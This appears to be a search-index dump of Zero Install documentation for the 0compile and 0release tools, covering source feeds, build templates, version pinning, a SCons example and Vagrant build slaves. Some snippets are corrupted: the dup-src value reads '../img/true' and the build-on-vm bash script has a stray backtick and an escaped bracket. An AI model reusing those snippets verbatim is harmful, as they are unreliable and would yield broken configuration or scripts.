compile:dup-src='../img/true' and 0compile will copy everything in $SRCDIR into build before building. compile:binary-lib-mappings (binary library major mappings) This is needed if you want to use 0install to compile a -dev package (containing header files) that works with a distribution-provided runtime package; see MakeHeaders for details. Customising the binary implementation You can specify a template <implementation> for the binary using <compile:implementation> . You can use this, for example, to add <command> elements to it. Here's a more complex example for a Java program: ... xmlns:compile=\"http://zero-install.sourceforge.net/2006/namespaces/0compile\" ... <implementation arch=\"*-src\" id=\".\" version=\"0.1-pre\"> <command name=\"compile\" path=\"src/Makefile\"> <runner interface='http://repo.roscidus.com/devel/make'> <arg>-f</arg> </runner> <compile:implementation arch='*-*'> <environment name='CLASSPATH' insert='.'/> <requires interface=\"http://repo.roscidus.com/utils/graphviz\"/> <command name='run'> <runner interface='http://repo.roscidus.com/java/openjdk-jre'/> <arg>com.example.MainClass</arg> </command> </compile:implementation> </command> <requires interface=\"http://repo.roscidus.com/java/iris\" compile:include-binary='true'/> <requires interface=\"http://repo.roscidus.com/java/openjdk-jdk\"> <environment name='PATH' insert='bin'/> </requires> </implementation> The interesting bits here are: arch=\"*-src\" tells us that the root <implementation> describes some source code. <compile:implementation> this is the template for the implementation that will be created by the compile. arch='*-*' indicates that the generated binary is platform independent (Java bytecode). <command name='run'> says how to run the resulting binary (by using the Java runtime). The dependencies are: graphviz and openjdk-jre only used at run-time (since they occur inside the <compile:implementation> ). openjdk-jdk only used at compile-time (occurs directly inside the source <implementation> ). iris used at compile-time and at run-time (has compile:include-binary attribute). Finally, there is a compile:if-0install-version attribute that you can place on any element in the template. 0compile will convert this to a plain if-0install-version in the generated output (you can't use if-0install-version directly because 0install would strip them out as appropriate for its version before 0compile saw them). Pinning version ranges Sometimes, you have a build time dependency with a wide range of possible versions, but the generated binary will have a runtime dependency on whichever version was used to compile it. The compile:pin-components attribute on a <version> element in the template will expand into before and after attributes that require the binary version to match the first n components of the version used to compile it. For example, if this program is compiled using Python 2.7.3, then the binary will have <version not-before='2.7' before='2.8'/> : <compile:implementation> <runner interface='http://repo.roscidus.com/python/python'> <version compile:pin-components=\"2\"/> </runner> </compile:implementation> (added in 0compile 1.4) Tips Using a separate source feed You can keep the source implementations in a separate file ( MyProg-src.xml ) and add a feed from the main feed, e.g.: <feed src='http://mysite/interfaces/MyProg-src.xml' arch='*-src'/> The arch attribute lets the injector know that it doesn't need to fetch this file unless it's looking for source code. Making library headers available (-dev packages) See Make-headers for information about publishing library source and -dev packages. Python distutils You should use the --build-base option to make distutils build to 0compile's build directory, not under the source code (which is read-only). Unfortunately, this option isn't available with the install command, so you have to do the build in two steps. A typical command is: $ cd \"$SRCDIR\" && $ python setup.py build --build-base=\"$BUILDDIR/build\" && $ cd \"$BUILDDIR\" && $ python \"$SRCDIR\"/setup.py install --home=\"$DISTDIR\" --skip-build Examples There are some template projects which can be used as a starting point for publishing your own software for various languages and build systems. Further reading Example: SCons This example shows how to compile a simple \"Hello world\" program using the SCons build system. Both the source and SCons are fetched using Zero Install.","title":"Developers"},{"location":"tools/0compile/developers/#making-source-available","text":"There are two common situations: You already have a source tarball somewhere and you want to publish an XML feed saying how to download and compile it (ideally, no changes should be needed to support 0install). For this, you should first read the Guide to packaging binaries . You have a development checkout (e.g. a Git clone or similar) and you want to say how to compile it. For this, you should first read the page about local feeds . To make source code available for others to use you need to add source implementations to the program's feed file. This is almost exactly the same as adding binaries, except that you give src as the machine (CPU) type: (if you want to script this process, take a look at 0template ) You can also edit the XML directly, which gives more control. A minimal source implementation might look like this: <implementation arch=\"*-src\" id=\".\" version=\"0.1-pre\"> <command name='compile' path='Makefile'> <runner interface='http://repo.roscidus.com/devel/make'> <arg>-f</arg> </runner> </command> </implementation> Note: you only need to use arch='*-src' to publish implementations for things that need to be compiled. Shell scripts, etc should not be marked as source code; use arch=\"*-*\" instead (which is the default anyway if arch is not given). For header files (-dev packages), there will often be a source implementation that generates the header files, but the resulting headers are not source (and will often be architecture-specific, e.g. Linux-i386 ). The job of the compile command is to call the actual build system. It is executed inside the build directory ( $BUILDDIR ). It must compile the source in $SRCDIR , putting the final result (ready for distribution) in $DISTDIR . The path to the generated feed for the new binary is $BINARYFEED , if you need it during the build. Instead of giving a <runner> , you may prefer to use a shell command. This is useful if you need to run more than one command. However, if the command starts to get complicated, you should move it to a script, either inside the main source archive or in a separate dependency, and just set this attribute to the command to run the script): <implementation arch=\"*-src\" id=\".\" version=\"0.1-pre\"> <command name='compile' shell-command='\"$SRCDIR/configure\" --prefix=\"$DISTDIR\" && make install'/> <requires interface='http://repo.roscidus.com/devel/make'> <executable-in-path name='make'/> </requires> </implementation> Starting with 0compile 1.1, this even works on Windows (it uses win-bash). There are also some extra attributes you can add to the implementation element: compile:binary-main Deprecated. Use <compile:implementation> instead (see below). compile:dup-src Some programs insist on creating files in their source directory, which is typically a read-only directory when using Zero Install. In this case, set compile:dup-src='../img/true' and 0compile will copy everything in $SRCDIR into build before building. compile:binary-lib-mappings (binary library major mappings) This is needed if you want to use 0install to compile a -dev package (containing header files) that works with a distribution-provided runtime package; see MakeHeaders for details.","title":"Making source available"},{"location":"tools/0compile/developers/#customising-the-binary-implementation","text":"You can specify a template <implementation> for the binary using <compile:implementation> . You can use this, for example, to add <command> elements to it. Here's a more complex example for a Java program: ... xmlns:compile=\"http://zero-install.sourceforge.net/2006/namespaces/0compile\" ... <implementation arch=\"*-src\" id=\".\" version=\"0.1-pre\"> <command name=\"compile\" path=\"src/Makefile\"> <runner interface='http://repo.roscidus.com/devel/make'> <arg>-f</arg> </runner> <compile:implementation arch='*-*'> <environment name='CLASSPATH' insert='.'/> <requires interface=\"http://repo.roscidus.com/utils/graphviz\"/> <command name='run'> <runner interface='http://repo.roscidus.com/java/openjdk-jre'/> <arg>com.example.MainClass</arg> </command> </compile:implementation> </command> <requires interface=\"http://repo.roscidus.com/java/iris\" compile:include-binary='true'/> <requires interface=\"http://repo.roscidus.com/java/openjdk-jdk\"> <environment name='PATH' insert='bin'/> </requires> </implementation> The interesting bits here are: arch=\"*-src\" tells us that the root <implementation> describes some source code. <compile:implementation> this is the template for the implementation that will be created by the compile. arch='*-*' indicates that the generated binary is platform independent (Java bytecode). <command name='run'> says how to run the resulting binary (by using the Java runtime). The dependencies are: graphviz and openjdk-jre only used at run-time (since they occur inside the <compile:implementation> ). openjdk-jdk only used at compile-time (occurs directly inside the source <implementation> ). iris used at compile-time and at run-time (has compile:include-binary attribute). Finally, there is a compile:if-0install-version attribute that you can place on any element in the template. 0compile will convert this to a plain if-0install-version in the generated output (you can't use if-0install-version directly because 0install would strip them out as appropriate for its version before 0compile saw them).","title":"Customising the binary implementation"},{"location":"tools/0compile/developers/#pinning-version-ranges","text":"Sometimes, you have a build time dependency with a wide range of possible versions, but the generated binary will have a runtime dependency on whichever version was used to compile it. The compile:pin-components attribute on a <version> element in the template will expand into before and after attributes that require the binary version to match the first n components of the version used to compile it. For example, if this program is compiled using Python 2.7.3, then the binary will have <version not-before='2.7' before='2.8'/> : <compile:implementation> <runner interface='http://repo.roscidus.com/python/python'> <version compile:pin-components=\"2\"/> </runner> </compile:implementation> (added in 0compile 1.4)","title":"Pinning version ranges"},{"location":"tools/0compile/developers/#tips","text":"","title":"Tips"},{"location":"tools/0compile/developers/#using-a-separate-source-feed","text":"You can keep the source implementations in a separate file ( MyProg-src.xml ) and add a feed from the main feed, e.g.: <feed src='http://mysite/interfaces/MyProg-src.xml' arch='*-src'/> The arch attribute lets the injector know that it doesn't need to fetch this file unless it's looking for source code.","title":"Using a separate source feed"},{"location":"tools/0compile/developers/#making-library-headers-available-dev-packages","text":"See Make-headers for information about publishing library source and -dev packages.","title":"Making library headers available (-dev packages)"},{"location":"tools/0compile/developers/#python-distutils","text":"You should use the --build-base option to make distutils build to 0compile's build directory, not under the source code (which is read-only). Unfortunately, this option isn't available with the install command, so you have to do the build in two steps. A typical command is: $ cd \"$SRCDIR\" && $ python setup.py build --build-base=\"$BUILDDIR/build\" && $ cd \"$BUILDDIR\" && $ python \"$SRCDIR\"/setup.py install --home=\"$DISTDIR\" --skip-build","title":"Python distutils"},{"location":"tools/0compile/developers/#examples","text":"There are some template projects which can be used as a starting point for publishing your own software for various languages and build systems.","title":"Examples"},{"location":"tools/0compile/developers/#further-reading","text":"Example: SCons This example shows how to compile a simple \"Hello world\" program using the SCons build system. Both the source and SCons are fetched using Zero Install.","title":"Further reading"},{"location":"tools/0compile/example-scons/","text":"Name: Hello-scons Maintainer: Thomas Leonard License: Public domain Source: Git repository Zero Install feed: http://0install.net/tests/Hello-scons.xml Hello-scons is a simple \"Hello world\" program written in C. It is built using the SCons build tool . Its purpose is to demonstrate the use of 0compile to fetch build dependencies; you do not need to install SCons manually on your system in order to build it. This example assumes that you have already read the main 0compile tutorial . You can try it out by using the setup command as usual: $ 0compile setup http://0install.net/tests/Hello-scons.xml Hello-scons 0compile will create a Hello-scons directory for the build. You will be prompted to choose the versions of Hello-scons and SCons: To build, change into the new directory and use the build command: $ cd Hello-scons $ 0compile build Executing: \"$SCONS/scons.py\" -f \"$SRCDIR/SConstruct\" --srcdir=\"$SRCDIR\" \"$DISTDIR\" This creates a hello-scons-ARCH directory ready for use and/or distribution, and a build directory with some temporary files, such as hello.o . This is used only to speed up later rebuilds. To run: $ 0launch hello-scons-linux-x86_64/0install/Hello-scons.xml Hello world! To see (or modify) a copy of the source: $ 0compile copy-src Copied as '/home/me/Hello-scons/src' The main issues with using SCons with 0compile are that: SCons defaults to saving build files in the source directory. 0compile requires that the source directory is not written to during the build (since the 0install cache is read-only). Therefore, you must use --srcdir . By default, SCons resets all environment variables. This means that instead of compiling against the library versions you chose, it will build against whatever happens to be the default on the system today. The src/SConstruct file shows how to fix these problems. For more information (including how to publish the binary using Zero Install), see the main 0compile tutorial . Building from a Git checkout To build the latest Git version of hello-scons: $ git clone git://zero-install.git.sourceforge.net/gitroot/zero-install/hello-scons $ cd hello-scons $ 0compile build $ 0launch hello-scons-linux-x86_64/0install/Hello-scons.xml Hello world!","title":"Example: SCons"},{"location":"tools/0compile/example-scons/#building-from-a-git-checkout","text":"To build the latest Git version of hello-scons: $ git clone git://zero-install.git.sourceforge.net/gitroot/zero-install/hello-scons $ cd hello-scons $ 0compile build $ 0launch hello-scons-linux-x86_64/0install/Hello-scons.xml Hello world!","title":"Building from a Git checkout"},{"location":"tools/0release/compiled-binaries/","text":"Releases with source and binary packages 0release can be used to create releases of your software from a version control system. The main page described how to make releases of programs which are architecture-independent (e.g. programs written in Python) where a single package is produced. This page explains what happens for programs which must be compiled for different architectures (e.g. C programs). The extended release process looks like this: TODO: 0release doesn't currently unit-test the binaries it produces After generating an archive and a feed for the source code release candidate (where arch='*-src' ), 0release also compiles a binary for the host system (using 0compile ). It uploads both the source and binary archive and publishes both in the Zero Install feed. For an example of a simple binary package that works this way, have a look at the c-prog.tgz package in 0release's tests directory: $ tar xzf c-prog.tgz $ mkdir release-c-prog $ cd release-c-prog $ 0launch http://0install.net/2007/interfaces/0release.xml ../c-prog/c-prog.xml Compiling on multiple systems To build binaries for multiple architectures, you'll need to create a configuration file listing the available builders . 0release uses the Base Directory Specification to find its configuration files; with the default settings, you need to create the file ~/.config/0install.net/0release/builders.conf . The builders.conf file has a [global] section listing the builders to use, followed by one section for each builder. Each builder can have three commands specified: one to start the builder (optional), one the actually do the build, and one to shutdown the builder (optional). Here is an example configuration: [global] builders = host, freebsd [builder-host] build = 0launch http://0install.net/2007/interfaces/0release.xml --build-slave \"$@\" [builder-precise32] build = build-on-vm precise32-build-slave This defines two builders named host and precise32 . host simply runs 0release in build-slave mode on the local machine (in fact, you don't need to specify this section because it exists by default). The precise32 builder run a script (see below ) to bring up a VirtualBox virtual machine, submit the build to it, and then shut it down again. The build command The build command is called with four arguments: The name of the generated XML feed file for the source release candidate. The name of the generated source archive. The URL of the directory where the release will be hosted eventually. The name of the binary feed to be generated. The three names are of files in the current directory without the directory part; this simplifies the copying. The build command must do three things: Copy the input files (the source feed and archive) to the build system. Invoke 0release --build-slave to do the build. Copy the results (the binary feed and archive) back to the local system. Setting up a Vagrant build slave First, we'll need to create a \"box\" with the build system. Create a Vagrantfile for the new box, e.g. Vagrant::Config.run do |config| config.vm.box = \"precise32\" config.vm.box_url = \"http://files.vagrantup.com/precise32.box\" end The bring the machine up and install the basic build environment. The only package required by 0release is 0install itself, but you must also install any system packages that are needed by the software to be built (i.e. those which can't be installed by 0install automatically): $ vagrant up $ vagrant ssh -c 'sudo apt-get update && sudo apt-get install -y zeroinstall-injector build-essential && mkdir -p ~vagrant/.cache/0install.net' Now package the VM into a new box and add it. You might wish to create a Vagrantfile.pkg to enable a shared 0install cache (see Virtual Machines / Vagrant ). $ vagrant package --vagrantfile Vagrantfile.pkg $ vagrant box add precise32-build-slave package.box Create the build-on-vm script, make it executable, and place it in your $PATH (on the host): #!/bin/bash set -eux if `[ -f Vagrantfile \\]; then vagrant destroy -f && rm Vagrantfile fi vagrant init \"$1\" shift vagrant up vagrant ssh-config > .ssh-config ssh -F .ssh-config default \\ 'cd /vagrant && 0launch --not-before 0.10 \\ http://0install.net/2007/interfaces/0release.xml \\ --build-slave \"$@\"' \"$@\" && \\ vagrant destroy -f && rm Vagrantfile You can then use it in your builders.conf , as above.","title":"Compiled binaries"},{"location":"tools/0release/compiled-binaries/#releases-with-source-and-binary-packages","text":"0release can be used to create releases of your software from a version control system. The main page described how to make releases of programs which are architecture-independent (e.g. programs written in Python) where a single package is produced. This page explains what happens for programs which must be compiled for different architectures (e.g. C programs). The extended release process looks like this: TODO: 0release doesn't currently unit-test the binaries it produces After generating an archive and a feed for the source code release candidate (where arch='*-src' ), 0release also compiles a binary for the host system (using 0compile ). It uploads both the source and binary archive and publishes both in the Zero Install feed. For an example of a simple binary package that works this way, have a look at the c-prog.tgz package in 0release's tests directory: $ tar xzf c-prog.tgz $ mkdir release-c-prog $ cd release-c-prog $ 0launch http://0install.net/2007/interfaces/0release.xml ../c-prog/c-prog.xml","title":"Releases with source and binary packages"},{"location":"tools/0release/compiled-binaries/#compiling-on-multiple-systems","text":"To build binaries for multiple architectures, you'll need to create a configuration file listing the available builders . 0release uses the Base Directory Specification to find its configuration files; with the default settings, you need to create the file ~/.config/0install.net/0release/builders.conf . The builders.conf file has a [global] section listing the builders to use, followed by one section for each builder. Each builder can have three commands specified: one to start the builder (optional), one the actually do the build, and one to shutdown the builder (optional). Here is an example configuration: [global] builders = host, freebsd [builder-host] build = 0launch http://0install.net/2007/interfaces/0release.xml --build-slave \"$@\" [builder-precise32] build = build-on-vm precise32-build-slave This defines two builders named host and precise32 . host simply runs 0release in build-slave mode on the local machine (in fact, you don't need to specify this section because it exists by default). The precise32 builder run a script (see below ) to bring up a VirtualBox virtual machine, submit the build to it, and then shut it down again.","title":"Compiling on multiple systems"},{"location":"tools/0release/compiled-binaries/#the-build-command","text":"The build command is called with four arguments: The name of the generated XML feed file for the source release candidate. The name of the generated source archive. The URL of the directory where the release will be hosted eventually. The name of the binary feed to be generated. The three names are of files in the current directory without the directory part; this simplifies the copying. The build command must do three things: Copy the input files (the source feed and archive) to the build system. Invoke 0release --build-slave to do the build. Copy the results (the binary feed and archive) back to the local system.","title":"The build command"},{"location":"tools/0release/compiled-binaries/#setting-up-a-vagrant-build-slave","text":"First, we'll need to create a \"box\" with the build system. Create a Vagrantfile for the new box, e.g. Vagrant::Config.run do |config| config.vm.box = \"precise32\" config.vm.box_url = \"http://files.vagrantup.com/precise32.box\" end The bring the machine up and install the basic build environment. The only package required by 0release is 0install itself, but you must also install any system packages that are needed by the software to be built (i.e. those which can't be installed by 0install automatically): $ vagrant up $ vagrant ssh -c 'sudo apt-get update && sudo apt-get install -y zeroinstall-injector build-essential && mkdir -p ~vagrant/.cache/0install.net' Now package the VM into a new box and add it. You might wish to create a Vagrantfile.pkg to enable a shared 0install cache (see Virtual Machines / Vagrant ). $ vagrant package --vagrantfile Vagrantfile.pkg $ vagrant box add precise32-build-slave package.box Create the build-on-vm script, make it executable, and place it in your $PATH (on the host): #!/bin/bash set -eux if `[ -f Vagrantfile \\]; then vagrant destroy -f && rm Vagrantfile fi vagrant init \"$1\" shift vagrant up vagrant ssh-config > .ssh-config ssh -F .ssh-config default \\ 'cd /vagrant && 0launch --not-before 0.10 \\ http://0install.net/2007/interfaces/0release.xml \\ --build-slave \"$@\"' \"$@\" && \\ vagrant destroy -f && rm Vagrantfile You can then use it in your builders.conf , as above.","title":"Setting up a Vagrant build slave"},{"location":"tools/0release/customisation/","text":"0release can be used to create releases of your software from a version control system. It uses sensible defaults, allowing it to create releases for simple projects with very little configuration. For more complex projects, you can specify extra commands that should be run during the release process using the syntax described here. Contents: Example Phase: commit-release Phase: generate-archive <add-toplevel-directory> Example For example, imagine that our hello-world example program now prints out a banner with its version number when run. hello.py now looks like this: #!/usr/bin/env python version='0.1' print \"Welcome to Hello World version %s\" % version print \"Hello World!\" We want to make sure that the number in the hello.py file is updated automatically when we make a new release. To do this, add a element to your feed, like this: <interface xmlns=\"http://zero-install.sourceforge.net/2004/injector/interface\"> <name>HelloWorld</name> <summary>minimal demonstration package for 0release</summary> <description> This program outputs the message \"Hello World\". You can create new releases of it using 0release. </description> <release:management xmlns:release='http://zero-install.sourceforge.net/2007/namespaces/0release'> <release:action phase='commit-release'>sed -i \"s/^version='.*'$/version='$RELEASE_VERSION'/\" hello.py</release:action> </release:management> ... </interface> This tells 0release that during the commit-release phase (in which it updates the version number to the number chosen for the release) it should execute the given command, which updates the version line in the Python code. Of course, you can perform any action you want. Phase: commit-release Current directory The working copy (under version control), as specified by the id attribute in the feed. $RELEASE_VERSION The version chosen for the new release. These actions are run after the user has entered the version number for the new release. After the actions are run, 0release will update the local feed file with the new version number and commit all changes to the version control system. Any changes made to the working copy will therefore appear in both the history and also in the release archive. If your script fails (returns a non-zero exit status), 0release will abort but will not revert any changes made by the actions. You will have to manually revert any changes before 0release will allow you to restart the release process. Phase: generate-archive Current directory A temporary directory created by unpacking the archive exported from the SCM. $RELEASE_VERSION The version chosen for the new release. Once the release version is committed to version control, 0release exports that revision to a temporary directory. After running all the actions in this phase, the release tarball is created from the final state of the directory. Use this phase to generate files that should be in the release archive but not in the tagged revision under version control. Typical actions here are: Running autoconf to create a configure script. Building translations ( .mo files) from source .po files. Building documentation (e.g. HTML from DocBook sources). Notice that all the above generate platform independent files. Do not compile to platform-specific binaries here (e.g. do not compile C source files to executables). For such programs, you need one source package and multiple binary packages (one for each architecture). See Releases with source and binary packages for that. <add-toplevel-directory> Adding this element causes 0release to put everything in a sub-directory, named after the feed. This is probably only useful for ROX applications, where the version control system contains e.g. just AppRun but the release should contain archive-2.2/Archive/AppRun . This is done using: <release:management xmlns:release=\"http://zero-install.sourceforge.net/2007/namespaces/0release\"> <release:add-toplevel-directory/> </release:management>","title":"Customisation"},{"location":"tools/0release/customisation/#example","text":"For example, imagine that our hello-world example program now prints out a banner with its version number when run. hello.py now looks like this: #!/usr/bin/env python version='0.1' print \"Welcome to Hello World version %s\" % version print \"Hello World!\" We want to make sure that the number in the hello.py file is updated automatically when we make a new release. To do this, add a element to your feed, like this: <interface xmlns=\"http://zero-install.sourceforge.net/2004/injector/interface\"> <name>HelloWorld</name> <summary>minimal demonstration package for 0release</summary> <description> This program outputs the message \"Hello World\". You can create new releases of it using 0release. </description> <release:management xmlns:release='http://zero-install.sourceforge.net/2007/namespaces/0release'> <release:action phase='commit-release'>sed -i \"s/^version='.*'$/version='$RELEASE_VERSION'/\" hello.py</release:action> </release:management> ... </interface> This tells 0release that during the commit-release phase (in which it updates the version number to the number chosen for the release) it should execute the given command, which updates the version line in the Python code. Of course, you can perform any action you want.","title":"Example"},{"location":"tools/0release/customisation/#phase-commit-release","text":"Current directory The working copy (under version control), as specified by the id attribute in the feed. $RELEASE_VERSION The version chosen for the new release. These actions are run after the user has entered the version number for the new release. After the actions are run, 0release will update the local feed file with the new version number and commit all changes to the version control system. Any changes made to the working copy will therefore appear in both the history and also in the release archive. If your script fails (returns a non-zero exit status), 0release will abort but will not revert any changes made by the actions. You will have to manually revert any changes before 0release will allow you to restart the release process.","title":"Phase: commit-release"},{"location":"tools/0release/customisation/#phase-generate-archive","text":"Current directory A temporary directory created by unpacking the archive exported from the SCM. $RELEASE_VERSION The version chosen for the new release. Once the release version is committed to version control, 0release exports that revision to a temporary directory. After running all the actions in this phase, the release tarball is created from the final state of the directory. Use this phase to generate files that should be in the release archive but not in the tagged revision under version control. Typical actions here are: Running autoconf to create a configure script. Building translations ( .mo files) from source .po files. Building documentation (e.g. HTML from DocBook sources). Notice that all the above generate platform independent files. Do not compile to platform-specific binaries here (e.g. do not compile C source files to executables). For such programs, you need one source package and multiple binary packages (one for each architecture). See Releases with source and binary packages for that.","title":"Phase: generate-archive"},{"location":"tools/0release/customisation/#add-toplevel-directory62","text":"Adding this element causes 0release to put everything in a sub-directory, named after the feed. This is probably only useful for ROX applications, where the version control system contains e.g. just AppRun but the release should contain archive-2.2/Archive/AppRun . This is done using: <release:management xmlns:release=\"http://zero-install.sourceforge.net/2007/namespaces/0release\"> <release:add-toplevel-directory/> </release:management>","title":"&lt;add-toplevel-directory>"}]}